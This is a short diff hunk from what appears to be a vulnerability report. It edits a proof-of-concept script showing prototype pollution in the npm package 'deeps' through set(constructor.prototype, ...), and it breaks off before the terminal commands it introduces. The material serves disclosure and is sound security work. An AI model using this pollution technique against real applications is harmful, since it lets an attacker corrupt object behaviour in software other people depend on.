@@ -8,9 +8,9 @@
 ```javascript
 // poc.js
 const { set } = require('deeps')
-console.log(`Before: ${{}.polluted}`)
+console.log('Before: ', {}.polluted)
 set(constructor.prototype, 'polluted', true)
-console.log(`After: ${{}.polluted}`)
+console.log('After: ', {}.polluted)
 ```
 2. Execute the following commands in the terminal:
 ```bash
